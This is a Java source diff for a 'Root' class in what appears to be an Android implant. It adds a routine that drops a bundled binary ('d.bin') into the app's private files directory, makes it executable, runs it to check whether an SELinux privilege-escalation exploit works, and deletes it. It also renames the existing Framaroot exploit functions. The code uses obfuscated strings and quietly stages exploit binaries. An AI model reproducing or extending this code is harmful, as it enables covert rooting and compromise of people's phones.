@@ -204,7 +204,7 @@ public class Root {
 		}
 	}
 
-	static public boolean checkExploitability() {
+	static public boolean checkFramarootExploitability() {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 		final String exploitCheck = M.e("ec"); // ec
@@ -241,8 +241,46 @@ public class Root {
 			return false;
 		}
 	}
+	
+	static public boolean checkSELinuxExploitability() {
+		final File filesPath = Status.getAppContext().getFilesDir();
+		final String path = filesPath.getAbsolutePath();
+		final String exploitCheck = M.e("ecs"); // ecs
+		Execute ex = new Execute();
+		
+		InputStream stream = Utils.getAssetStream("d.bin");
 
-	static public boolean localExploit() {
+		try {
+			fileWrite(exploitCheck, stream, Cfg.RNDDB);
+
+			ex.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
+
+			int ret = ex.execute(path + M.e("/ecs")).exitCode;
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (checkExploitability) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/ecs"
+						+ " ret: " + ret);
+			}
+
+			File file = new File(Status.getAppContext().getFilesDir(), exploitCheck);
+			file.delete();
+
+			return ret > 0 ? true : false;
+		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(e1);//$NON-NLS-1$
+				Check.log(TAG + " (checkExploitability): Exception"); //$NON-NLS-1$
+			}
+
+			return false;
+		}
+	}
+
+	static public boolean framarootExploit() {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 		final String localExploit = M.e("l"); // local_exploit
@@ -378,6 +416,7 @@ public class Root {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getPermissions), ask the user");
 			}
+			
 			// Ask the user...
 			Root.superapkRoot();
 
